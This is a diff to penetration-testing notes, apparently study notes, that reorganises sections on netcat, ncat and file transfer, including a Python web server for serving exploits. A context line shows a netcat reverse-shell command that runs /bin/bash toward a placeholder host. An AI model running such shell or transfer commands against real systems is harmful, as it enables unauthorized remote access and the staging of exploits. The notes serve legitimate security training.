@@ -147,18 +147,6 @@ nc -nv [bob] 443 -e /bin/bash
 
 This is what hackers mean by popping shells, but usually it's getting a web server/desktop to send a reverse shell to your attack machine.
 
-### Transfer files
-
-To transfer files, set up a listener and redirect the output to a filename:
-
-```text
-nc -nlvp 443 > nc.exe # receiving machine
-listening on [any] 443...
-
-nc -nv [host] 443 < nc.exe # sending machine pushes file
-(UNKNOWN) [host] 443 (?) open
-```
-
 ## Ncat
 
 It's like netcat, but can encrypt connections and restrict access. 
@@ -173,6 +161,26 @@ Alice would connect securely to Bob:
 
 ```text
 ncat -v [bob] 443 --ssl
+```
+
+## File transfer
+
+### Python
+You'll use python's web server all the time to transfer exploits and move files between machines (or possibly even within machines). Pay attention to the port you use, as it may interfere with shells or firewalls:
+
+```
+cd exploits
+python -m SimpleHTTPServer 80
+```
+### Netcat
+To transfer files, set up a listener and redirect the output to a filename:
+
+```text
+nc -nlvp 443 > nc.exe # receiving machine
+listening on [any] 443...
+
+nc -nv [host] 443 < nc.exe # sending machine pushes file
+(UNKNOWN) [host] 443 (?) open
 ```
 
 ## Further reading
